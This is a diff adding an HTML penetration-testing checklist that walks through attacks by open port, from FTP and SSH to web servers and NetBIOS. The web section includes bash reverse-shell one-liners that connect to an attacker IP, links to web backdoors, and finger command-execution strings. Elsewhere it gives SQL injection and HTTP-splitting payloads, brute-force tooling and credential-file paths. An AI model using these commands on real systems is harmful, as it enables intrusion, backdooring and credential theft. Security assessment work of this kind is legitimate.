@@ -1,0 +1,1427 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tree</title>
+</head><body><ul><li>FTP port 21 open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server</li>
+<li style="list-style-type: none"><ul><li>telnet ip_address 21 (Banner grab)</li>
+<li>Run command ftp ip_address</li>
+<li>ftp@example.com</li>
+<li>Check for anonymous access</li>
+<li style="list-style-type: none"><ul><li>ftp ip_addressUsername: anonymous OR anonPassword: any@email.com</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Password guessing</li>
+<li style="list-style-type: none"><ul><li><a href="http://freeworld.thc.org/">Hydra brute force</a></li>
+<li><a href="http://www.foofus.net/jmk/medusa/">medusa</a></li>
+<li><a href="http://www.hoobie.net/brutus/">Brutus</a></li>
+</ul>
+</li>
+<li>Examine configuration files</li>
+<li style="list-style-type: none"><ul><li>ftpusers</li>
+<li>ftp.conf</li>
+<li>proftpd.conf</li>
+</ul>
+</li>
+<li>MiTM</li>
+<li style="list-style-type: none"><ul><li><a href="http://packetstormsecurity.org/0007-exploits/pasvagg.pl">pasvagg.pl</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSH port 22 open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server</li>
+<li style="list-style-type: none"><ul><li>telnet ip_address 22 (banner grab)</li>
+<li><a href="http://www.monkey.org/~provos/scanssh/">scanssh</a></li>
+<li style="list-style-type: none"><ul><li>scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Password guessing</li>
+<li style="list-style-type: none"><ul><li>ssh root@ip_address</li>
+<li><a href="http://packetstormsecurity.org/groups/teso/guess-who-0.44.tgz">guess-who</a></li>
+<li style="list-style-type: none"><ul><li>./b -l username -h ip_address -p 22 -2 &lt; password_file_location</li>
+</ul>
+</li>
+<li><a href="http://freeworld.thc.org/">Hydra brute force</a></li>
+<li><a href="http://www.edge-security.com/edge-soft.php">brutessh</a></li>
+<li><a href="http://www.darkc0de.com/c0de/ruby/sshbrute.txt">Ruby SSH Bruteforcer</a></li>
+</ul>
+</li>
+<li>Examine configuration files</li>
+<li style="list-style-type: none"><ul><li>ssh_config</li>
+<li>sshd_config</li>
+<li>authorized_keys</li>
+<li>ssh_known_hosts</li>
+<li>.shosts</li>
+</ul>
+</li>
+<li>SSH Client programs</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.bitvise.com/">tunnelier</a></li>
+<li><a href="http://www.bitvise.com/winsshd">winsshd</a></li>
+<li><a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/">putty</a></li>
+<li><a href="http://winscp.net/eng/index.php">winscp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Telnet port 23 open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server</li>
+<li style="list-style-type: none"><ul><li>telnet ip_address</li>
+<li style="list-style-type: none"><ul><li>Common Banner ListOS/BannerSolaris 8/SunOS 5.8Solaris 2.6/SunOS 5.6Solaris 2.4 or 2.5.1/Unix(r) System V Release 4.0 (hostname)SunOS 4.1.x/SunOS Unix (hostname)FreeBSD/FreeBSD/i386 (hostname) (ttyp1)NetBSD/NetBSD/i386 (hostname) (ttyp1)OpenBSD/OpenBSD/i386 (hostname) (ttyp1)Red Hat 8.0/Red Hat Linux release 8.0 (Psyche)Debian 3.0/Debian GNU/Linux 3.0 / hostnameSGI IRIX 6.x/IRIX (hostname)IBM AIX 4.1.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1994.IBM AIX 4.2.x or 4.3.x/AIX Version 4 (C) Copyrights by IBM and by others 1982, 1996.Nokia IPSO/IPSO (hostname) (ttyp0)Cisco IOS/User Access VerificationLivingston ComOS/ComOS - Livingston PortMaster</li>
+</ul>
+</li>
+<li><a href="http://www.securiteam.com/tools/6J00L0K06U.html">telnetfp</a></li>
+</ul>
+</li>
+<li>Password Attack</li>
+<li style="list-style-type: none"><ul><li></li>
+<li><a href="http://www.vulnerabiliyassessment.co.uk/passwords.htm">Common passwords</a></li>
+<li></li>
+<li><a href="http://freeworld.thc.org/">Hydra brute force</a></li>
+<li><a href="http://www.hoobie.net/brutus/">Brutus</a></li>
+<li>telnet -l "-froot" hostname (Solaris 10+)</li>
+</ul>
+</li>
+<li>Examine configuration files</li>
+<li style="list-style-type: none"><ul><li>/etc/inetd.conf</li>
+<li>/etc/xinetd.d/telnet</li>
+<li>/etc/xinetd.d/stelnet</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Sendmail Port 25 open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server</li>
+<li style="list-style-type: none"><ul><li>telnet ip_address 25 (banner grab)</li>
+</ul>
+</li>
+<li>Mail Server Testing</li>
+<li style="list-style-type: none"><ul><li>Enumerate users</li>
+<li style="list-style-type: none"><ul><li>VRFY username (verifies if username exists - enumeration of accounts)</li>
+<li>EXPN username (verifies if username is valid - enumeration of accounts)</li>
+</ul>
+</li>
+<li>Mail Spoof Test</li>
+<li style="list-style-type: none"><ul><li>HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT</li>
+</ul>
+</li>
+<li>Mail Relay Test</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>HELO anything</li>
+<li></li>
+<li style="list-style-type: none"><ul><li>Identical to/from - mail from: &lt;nobody@domain&gt; rcpt to: &lt;nobody@domain&gt;</li>
+<li>Unknown domain - mail from: &lt;user@unknown_domain&gt;</li>
+<li>Domain not present - mail from: &lt;user@localhost&gt;</li>
+<li>Domain not supplied - mail from: &lt;user&gt;</li>
+<li></li>
+<li>Source address omission - mail from: &lt;&gt; rcpt to: &lt;nobody@recipient_domain&gt;</li>
+<li></li>
+<li>Use IP address of target server - mail from: &lt;user@IP_Address&gt; rcpt to: &lt;nobody@recipient_domain&gt;</li>
+<li></li>
+<li>Use double quotes - mail from: &lt;user@domain&gt; rcpt to: &lt;"user@recipent-domain"&gt;</li>
+<li></li>
+<li></li>
+<li>User IP address of the target server - mail from: &lt;user@domain&gt; rcpt to: &lt;nobody@recipient_domain@[IP Address]&gt;</li>
+<li></li>
+<li></li>
+<li>Disparate formatting - mail from: &lt;user@[IP Address]&gt; rcpt to: &lt;@domain:nobody@recipient-domain&gt;</li>
+<li></li>
+<li></li>
+<li>Disparate formatting2 - mail from: &lt;user@[IP Address]&gt; rcpt to: &lt;recipient_domain!nobody@[IP Address]&gt;</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>sendmail.cf</li>
+<li>submit.cf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DNS port 53 open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server/ service</li>
+<li style="list-style-type: none"><ul><li>host</li>
+<li style="list-style-type: none"><ul><li>host [-aCdlnrTwv ] [-c class ] [-N ndots ] [-R number ] [-t type ] [-W wait ] name [server ] -v verbose format -t (query type) Allows a user to specify a record type i.e. A, NS, or PTR. -a Same as –t ANY. -l Zone transfer (if allowed). -f Save to a specified filename.</li>
+</ul>
+</li>
+<li>nslookup</li>
+<li style="list-style-type: none"><ul><li>nslookup [ -option ... ] [ host-to-find | - [ server ]]</li>
+</ul>
+</li>
+<li>dig</li>
+<li style="list-style-type: none"><ul><li>dig [ @server ] [-b address ] [-c class ] [-f filename ] [-k filename ] [-p port# ] [-t type ] [-x addr ] [-y name:key ] [-4 ] [-6 ] [name ] [type ] [class ] [queryopt... ]</li>
+</ul>
+</li>
+<li>whois-h Use the named host to resolve the query -a Use ARIN to resolve the query -r Use RIPE to resolve the query -p Use APNIC to resolve the query -Q Perform a quick lookup</li>
+</ul>
+</li>
+<li>DNS Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.sensepost.com/">Bile Suite</a></li>
+<li style="list-style-type: none"><ul><li>perl BiLE.pl [website] [project_name]</li>
+<li>perl BiLE-weigh.pl [website] [input file]</li>
+<li>perl vet-IPrange.pl [input file] [true domain file] [output file] &lt;range&gt;</li>
+<li>perl vet-mx.pl [input file] [true domain file] [output file]</li>
+<li>perl exp-tld.pl [input file] [output file]</li>
+<li>perl jarf-dnsbrute [domain_name] (brutelevel) [file_with_names]</li>
+<li>perl qtrace.pl [ip_address_file] [output_file]</li>
+<li>perl jarf-rev [subnetblock] [nameserver]</li>
+</ul>
+</li>
+<li><a href="http://www.txdns.net/">txdns</a></li>
+<li style="list-style-type: none"><ul><li>txdns -rt -t domain_name</li>
+<li>txdns -x 50 -bb domain_name</li>
+<li>txdns --verbose -fm wordlist.dic --server ip_address -rr SOA domain_name -h c: \hostlist.txt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>host.conf</li>
+<li>resolv.conf</li>
+<li>named.conf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>TFTP port 69 open</li>
+<li style="list-style-type: none"><ul><li>TFTP Enumeration</li>
+<li style="list-style-type: none"><ul><li>tftp ip_address PUT local_file</li>
+<li>tftp ip_address GET conf.txt (or other files)</li>
+<li>Solarwinds TFTP server</li>
+<li>tftp – i &lt;IP&gt; GET /etc/passwd (old Solaris)</li>
+</ul>
+</li>
+<li>TFTP Bruteforcing</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.arhont.com/digitalAssets/">TFTP bruteforcer</a></li>
+<li><a href="http://www.hackingciscoexposed.com/?link=tools">Cisco-Torch</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Finger Port 79 open</li>
+<li style="list-style-type: none"><ul><li>User enumeration</li>
+<li style="list-style-type: none"><ul><li>finger 'a b c d e f g h' @example.com</li>
+<li>finger admin@example.com</li>
+<li>finger user@example.com</li>
+<li>finger 0@example.com</li>
+<li>finger .@example.com</li>
+<li>finger **@example.com</li>
+<li>finger test@example.com</li>
+<li>finger @example.com</li>
+</ul>
+</li>
+<li>Command execution</li>
+<li style="list-style-type: none"><ul><li>finger "|/bin/id@example.com"</li>
+<li>finger "|/bin/ls -a /@example.com"</li>
+</ul>
+</li>
+<li>Finger Bounce</li>
+<li style="list-style-type: none"><ul><li>finger user@host@victim</li>
+<li>finger @internal@external</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Web Ports 80, 8080 etc. open</li>
+<li style="list-style-type: none"><ul><li>Fingerprint server</li>
+<li style="list-style-type: none"><ul><li>Telnet ip_address port</li>
+<li>Firefox plugins</li>
+<li style="list-style-type: none"><ul><li>All</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.security-database.com/">firecat</a></li>
+</ul>
+</li>
+<li>Specific</li>
+<li style="list-style-type: none"><ul><li><a href="https://addons.mozilla.org/">add n edit cookies</a></li>
+<li><a href="https://addons.mozilla.org/">asnumber</a></li>
+<li><a href="https://addons.mozilla.org/">header spy</a></li>
+<li><a href="https://addons.mozilla.org/">live http headers</a></li>
+<li><a href="https://addons.mozilla.org/">shazou</a></li>
+<li><a href="http://chrispederick.com/work/web-developer/">web developer</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Crawl website</li>
+<li style="list-style-type: none"><ul><li>lynx [options] startfile/URL Options include -traversal -crawl -dump -image_links -source</li>
+<li><a href="http://net-square.com/httprint/httprint_paper.html">httprint</a></li>
+<li><a href="http://www.edge-security.com/metagoofil.php">Metagoofil</a></li>
+<li style="list-style-type: none"><ul><li>metagoofil.py -d [domain] -l [no. of] -f [type] -o results.html</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Web Directory enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.cirt.net/code/nikto.shtml">Nikto</a></li>
+<li style="list-style-type: none"><ul><li>nikto [-h target] [options]</li>
+</ul>
+</li>
+<li><a href="http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a></li>
+<li><a href="http://www.sensepost.com/research/wikto/">Wikto</a></li>
+<li><a href="http://www.goolag.org/download.html">Goolag Scanner</a></li>
+</ul>
+</li>
+<li>Vulnerability Assessment</li>
+<li style="list-style-type: none"><ul><li>Manual Tests</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.vulnerabilityassessment.co.uk/Passwords.htm">Default Passwords</a></li>
+<li>Install Backdoors</li>
+<li style="list-style-type: none"><ul><li>ASP</li>
+<li style="list-style-type: none"><ul><li>http://packetstormsecurity.org/UNIX/penetration/aspxshell.aspx.txt</li>
+</ul>
+</li>
+<li>Assorted</li>
+<li style="list-style-type: none"><ul><li>http://michaeldaw.org/projects/web-backdoor-compilation/</li>
+<li>http://open-labs.org/hacker_webkit02.tar.gz</li>
+</ul>
+</li>
+<li>Perl</li>
+<li style="list-style-type: none"><ul><li>http://home.arcor.de/mschierlm/test/pmsh.pl</li>
+<li>http://pentestmonkey.net/tools/perl-reverse-shell/</li>
+<li>http://freeworld.thc.org/download.php?t=r&amp;f=rwwwshell-2.0.pl.gz</li>
+</ul>
+</li>
+<li>PHP</li>
+<li style="list-style-type: none"><ul><li>http://php.spb.ru/remview/</li>
+<li>http://pentestmonkey.net/tools/php-reverse-shell/</li>
+<li>http://pentestmonkey.net/tools/php-findsock-shell/</li>
+</ul>
+</li>
+<li>Python</li>
+<li style="list-style-type: none"><ul><li>http://matahari.sourceforge.net/</li>
+</ul>
+</li>
+<li>TCL</li>
+<li style="list-style-type: none"><ul><li>http://www.irmplc.com/download_pdf.php?src=Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf&amp;force=yes</li>
+</ul>
+</li>
+<li>Bash Connect Back Shell</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">GnuCitizen</a></li>
+<li style="list-style-type: none"><ul><li>Atttack Box: nc -l -p Port -vvv</li>
+<li></li>
+<li>Victim: $ exec 5&lt;&gt;/dev/tcp/IP_Address/Port</li>
+<li>Victim: $ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</li>
+<li></li>
+</ul>
+</li>
+<li><a href="http://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/">Neohapsis</a></li>
+<li style="list-style-type: none"><ul><li>Atttack Box: nc -l -p Port -vvv</li>
+<li></li>
+<li>Victim: $ exec 0&lt;/dev/tcp/IP_Address/Port # First we copy our connection over stdin</li>
+<li>Victim: $ exec 1&gt;&amp;0 # Next we copy stdin to stdout</li>
+<li>Victim: $ exec 2&gt;&amp;0 # And finally stdin to stderr</li>
+<li>Victim: $ exec /bin/sh 0&lt;/dev/tcp/IP_Address/Port 1&gt;&amp;0 2&gt;&amp;0</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Method Testing</li>
+<li style="list-style-type: none"><ul><li>nc IP_Adress Port</li>
+<li style="list-style-type: none"><ul><li>HEAD / HTTP/1.0</li>
+<li>OPTIONS / HTTP/1.0</li>
+<li>PROPFIND / HTTP/1.0</li>
+<li>TRACE / HTTP/1.1</li>
+<li>PUT http://Target_URL/FILE_NAME</li>
+<li>POST http://Target_URL/FILE_NAME HTTP/1.x</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Upload Files</li>
+<li style="list-style-type: none"><ul><li>curl</li>
+<li style="list-style-type: none"><ul><li>curl -u &lt;username:password&gt; -T file_to_upload &lt;Target_URL&gt;</li>
+<li>curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" &lt;Target_URL&gt;</li>
+</ul>
+</li>
+<li><a href="http://examples.oreilly.com/networksa/tools/put.pl">put.pl</a></li>
+<li style="list-style-type: none"><ul><li>put.pl -h target -r /remote_file_name -f local_file_name</li>
+</ul>
+</li>
+<li>webdav</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.webdav.org/cadaver/">cadaver</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>View Page Source</li>
+<li style="list-style-type: none"><ul><li>Hidden Values</li>
+<li>Developer Remarks</li>
+<li>Extraneous Code</li>
+<li>Passwords!</li>
+</ul>
+</li>
+<li><a href="http://michaeldaw.org/input_validation_cheat_sheet/">Input Validation Checks</a></li>
+<li style="list-style-type: none"><ul><li>NULL or null</li>
+<li style="list-style-type: none"><ul><li>Possible error messages returned.</li>
+</ul>
+</li>
+<li>' , " , ; , &lt;!</li>
+<li style="list-style-type: none"><ul><li>Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.</li>
+</ul>
+</li>
+<li>– , = , + , "</li>
+<li style="list-style-type: none"><ul><li>Used to craft SQL Injection queries.</li>
+</ul>
+</li>
+<li>‘ , &amp;, ! , ¦ , &lt; , &gt;</li>
+<li style="list-style-type: none"><ul><li>Used to find command execution vulnerabilities.</li>
+</ul>
+</li>
+<li>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</li>
+<li style="list-style-type: none"><ul><li>Basic Cross-Site Scripting Checks.</li>
+</ul>
+</li>
+<li>%0d%0a</li>
+<li style="list-style-type: none"><ul><li>Carriage Return (%0d) Line Feed (%0a)</li>
+<li style="list-style-type: none"><ul><li>HTTP Splitting</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;</li>
+<li></li>
+<li style="list-style-type: none"><ul><li>i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47&lt;html&gt;blah&lt;/html&gt;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Cache Poisoning</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>%7f , %ff</li>
+<li style="list-style-type: none"><ul><li>byte-length overflows; maximum 7- and 8-bit values.</li>
+</ul>
+</li>
+<li>-1, other</li>
+<li style="list-style-type: none"><ul><li>Integer and underflow vulnerabilities.</li>
+</ul>
+</li>
+<li>%n , %x , %s</li>
+<li style="list-style-type: none"><ul><li>Testing for format string vulnerabilities.</li>
+</ul>
+</li>
+<li>../</li>
+<li style="list-style-type: none"><ul><li>Directory Traversal Vulnerabilities.</li>
+</ul>
+</li>
+<li>% , _, *</li>
+<li style="list-style-type: none"><ul><li>Wildcard characters can sometimes present DoS issues or information disclosure.</li>
+</ul>
+</li>
+<li>Ax1024+</li>
+<li style="list-style-type: none"><ul><li>Overflow vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Automated table and column iteration</li>
+<li style="list-style-type: none"><ul><li><a href="http://forum.darkc0de.com/">orderby.py</a></li>
+<li style="list-style-type: none"><ul><li>./orderby.py www.site.com/index.php?id=</li>
+</ul>
+</li>
+<li><a href="http://forum.darkc0de.com/">d3sqlfuzz.py</a></li>
+<li style="list-style-type: none"><ul><li>./d3sqlfuzz.py www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,COLUMN,3+FROM+TABLE--</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Vulnerability Scanners</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.acunetix.com/">Acunetix</a></li>
+<li><a href="http://grendel-scan.com/">Grendelscan</a></li>
+<li><a href="http://www.nstalker.com/eng/products/nstealth/free/download.php">NStealth</a></li>
+<li><a href="http://www.phenoelit-us.org/obiwan/docu.html">Obiwan III</a></li>
+<li><a href="http://w3af.sourceforge.net/">w3af</a></li>
+</ul>
+</li>
+<li>Specific Applications/ Server Tools</li>
+<li style="list-style-type: none"><ul><li>Domino</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.irmplc.com/Tools/dominoaudit.pl">dominoaudit</a></li>
+<li style="list-style-type: none"><ul><li>dominoaudit.pl [options] -h &lt;IP&gt;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Joomla</li>
+<li style="list-style-type: none"><ul><li><a href="http://packetstormsecurity.org/filedesc/cms_few.py.txt.html">cms_few</a></li>
+<li style="list-style-type: none"><ul><li>./cms.py &lt;site-name&gt;</li>
+</ul>
+</li>
+<li><a href="http://packetstormsecurity.org/UNIX/scanners/joomsq.py.txt">joomsq</a></li>
+<li style="list-style-type: none"><ul><li>./joomsq.py &lt;IP&gt;</li>
+</ul>
+</li>
+<li><a href="http://packetstormsecurity.nl/filedesc/joomlascan.py.txt.html">joomlascan</a></li>
+<li style="list-style-type: none"><ul><li></li>
+<li>./joomlascan.py &lt;site&gt; &lt;options&gt;  [options i.e. -p/-proxy &lt;host:port&gt; : Add proxy support -404 : Don't show 404 responses]</li>
+<li></li>
+</ul>
+</li>
+<li><a href="http://www.darkc0de.com/others/joomscan.py">joomscan</a></li>
+<li style="list-style-type: none"><ul><li>./joomscan.py -u "www.site.com/joomladir/" -o site.txt -p 127.0.0.1:80</li>
+</ul>
+</li>
+<li><a href="http://destr0y.net/showthread.php?t=137">jscan</a></li>
+<li style="list-style-type: none"><ul><li>jscan.pl -f hostname</li>
+<li>(shell.txt required)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.indianz.ch/toolslnxe.html">aspaudit.pl</a></li>
+<li style="list-style-type: none"><ul><li>asp-audit.pl http://target/app/filename.aspx (options i.e. -bf)</li>
+</ul>
+</li>
+<li>Vbulletin</li>
+<li style="list-style-type: none"><ul><li><a href="http://darkc0de.com/scanners/">vbscan.py</a></li>
+<li style="list-style-type: none"><ul><li>vbscan.py &lt;host&gt; &lt;port&gt; -v</li>
+<li>vbscan.py -update</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ZyXel</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.gnucitizen.org/static/blog/2008/04/hacking_zyxel_gateways_part_2.pdf">zyxel-bf.sh</a></li>
+<li>snmpwalk</li>
+<li style="list-style-type: none"><ul><li>snmpwalk -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2</li>
+</ul>
+</li>
+<li>snmpget</li>
+<li style="list-style-type: none"><ul><li>snmpget -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2.6.0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Proxy Testing</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.portswigger.net/">Burpsuite</a></li>
+<li><a href="http://www.sensepost.com/research/crowbar%20">Crowbar</a></li>
+<li><a href="http://www.woany.co.uk/">Interceptor</a></li>
+<li><a href="http://www.parosproxy.org/index.shtml">Paros</a></li>
+<li><a href="http://www.woany.co.uk/">Requester Raw</a></li>
+<li><a href="http://www.sensepost.com/research/suru/">Suru</a></li>
+<li><a href="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project">WebScarab</a></li>
+</ul>
+</li>
+<li>Examine configuration files</li>
+<li style="list-style-type: none"><ul><li>Generic</li>
+<li style="list-style-type: none"><ul><li>Examine httpd.conf/ windows config files</li>
+</ul>
+</li>
+<li><a href="http://packetstormsecurity.org/papers/attack/Whitepaper-Hacking-jBoss-using-a-Browser.pdf">JBoss</a></li>
+<li style="list-style-type: none"><ul><li>JMX Console http://&lt;IP&gt;:8080/jmxconcole/</li>
+<li style="list-style-type: none"><ul><li><a href="http://access1.sun.com/techarticles/simple.WAR.html">War File</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Joomla</li>
+<li style="list-style-type: none"><ul><li>configuration.php</li>
+<li>diagnostics.php</li>
+<li>joomla.inc.php</li>
+<li>config.inc.php</li>
+</ul>
+</li>
+<li>Mambo</li>
+<li style="list-style-type: none"><ul><li>configuration.php</li>
+<li>config.inc.php</li>
+</ul>
+</li>
+<li>Wordpress</li>
+<li style="list-style-type: none"><ul><li>setup-config.php</li>
+<li>wp-config.php</li>
+</ul>
+</li>
+<li><a href="http://packetstormsecurity.org/papers/attack/Hacking_ZyXEL_Gateways.pdf">ZyXel</a></li>
+<li style="list-style-type: none"><ul><li>/WAN.html (contains PPPoE ISP password)</li>
+<li>/WLAN_General.html and /WLAN.html (contains WEP key)</li>
+<li>/rpDyDNS.html (contains DDNS credentials)</li>
+<li>/Firewall_DefPolicy.html (Firewall)</li>
+<li>/CF_Keyword.html (Content Filter)</li>
+<li>/RemMagWWW.html (Remote MGMT)</li>
+<li>/rpSysAdmin.html (System)</li>
+<li>/LAN_IP.html (LAN)</li>
+<li>/NAT_General.html (NAT)</li>
+<li>/ViewLog.html (Logs)</li>
+<li>/rpFWUpload.html (Tools)</li>
+<li>/DiagGeneral.html (Diagnostic)</li>
+<li>/RemMagSNMP.html (SNMP Passwords)</li>
+<li>/LAN_ClientList.html (Current DHCP Leases)</li>
+<li>Config Backups</li>
+<li style="list-style-type: none"><ul><li>/RestoreCfg.html</li>
+<li>/BackupCfg.html</li>
+<li>Note: - The above config files are not human readable and the following tool is required to breakout possible admin credentials and other important settings</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.mindmasters.nl/kender/zyxel/configreader.zip">ZyXEL Config Reader</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Examine web server logs</li>
+<li style="list-style-type: none"><ul><li>c:\winnt\system32\Logfiles\W3SVC1</li>
+<li style="list-style-type: none"><ul><li>awk -F " " '{print $3,$11} filename | sort | uniq</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>References</li>
+<li style="list-style-type: none"><ul><li>White Papers</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.isecpartners.com/files/CSRF_Paper.pdf">Cross Site Request Forgery: An Introduction to a Common Web Application Weakness</a></li>
+<li><a href="http://www.isecpartners.com/files/iSEC_HILL_AttackingXMLSecurity_Handout.pdf">Attacking Web Service Security: Message Oriented Madness, XML Worms and Web Service Security Sanity</a></li>
+<li><a href="http://www.isecpartners.com/files/iSEC_Scott_Stender_Blind_Security_Testing.bh07.pdf">Blind Security Testing - An Evolutionary Approach</a></li>
+<li><a href="http://www.isecpartners.com/files/XMLDSIG_Command_Injection.pdf">Command Injection in XML Signatures and Encryption</a></li>
+<li><a href="http://michaeldaw.org/input_validation_cheat_sheet/">Input Validation Cheat Sheet</a></li>
+<li><a href="http://michaeldaw.org/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet</a></li>
+</ul>
+</li>
+<li>Books</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.isecpartners.com/hackingexposedweb20.html">Hacking Exposed Web 2.0</a></li>
+<li><a href="http://www.webhackingexposed.com/">Hacking Exposed Web Applications</a></li>
+<li><a href="http://portswigger.net/wahh/">The Web Application Hacker's Handbook</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Exploit Frameworks</li>
+<li style="list-style-type: none"><ul><li>Brute-force Tools</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.acunetix.com/">Acunetix</a></li>
+</ul>
+</li>
+<li><a href="http://www.metasploit.com/">Metasploit</a></li>
+<li><a href="http://w3af.sourceforge.net/">w3af</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Portmapper port 111 open</li>
+<li style="list-style-type: none"><ul><li><a href="http://oss.coresecurity.com/impacket/rpcdump.py">rpcdump.py</a></li>
+<li style="list-style-type: none"><ul><li>rpcdump.py username:password@IP_Address port/protocol (i.e. 80/HTTP)</li>
+</ul>
+</li>
+<li>rpcinfo</li>
+<li style="list-style-type: none"><ul><li>rpcinfo [options] IP_Address</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>NTP Port 123 open</li>
+<li style="list-style-type: none"><ul><li>NTP Enumeration</li>
+<li style="list-style-type: none"><ul><li>ntpdc -c monlist IP_ADDRESS</li>
+<li>ntpdc -c sysinfo IP_ADDRESS</li>
+<li>ntpq</li>
+<li style="list-style-type: none"><ul><li>host</li>
+<li>hostname</li>
+<li>ntpversion</li>
+<li>readlist</li>
+<li>version</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Examine configuration files</li>
+<li style="list-style-type: none"><ul><li>ntp.conf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>NetBIOS Ports 135-139,445 open</li>
+<li style="list-style-type: none"><ul><li>NetBIOS enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.bindview.com/Services/RAZOR/Utilities/Windows/enum_readme.cfm">Enum</a></li>
+<li style="list-style-type: none"><ul><li>enum &lt;-UMNSPGLdc&gt; &lt;-u username&gt; &lt;-p password&gt; &lt;-f dictfile&gt; &lt;hostname|ip&gt;</li>
+</ul>
+</li>
+<li>Null Session</li>
+<li style="list-style-type: none"><ul><li>net use \\192.168.1.1\ipc$ "" /u:""</li>
+<li style="list-style-type: none"><ul><li>net view \\ip_address</li>
+<li><a href="http://www.systemtools.com/download/dumpacl.zip">Dumpsec</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Smbclient</li>
+<li style="list-style-type: none"><ul><li>smbclient -L //server/share password options</li>
+</ul>
+</li>
+<li><a href="http://www.foundstone.com/index.htm?subnav=resources/navigation.htm&subcontent=/resources/proddesc/superscan.htm">Superscan</a></li>
+<li style="list-style-type: none"><ul><li>Enumeration tab.</li>
+</ul>
+</li>
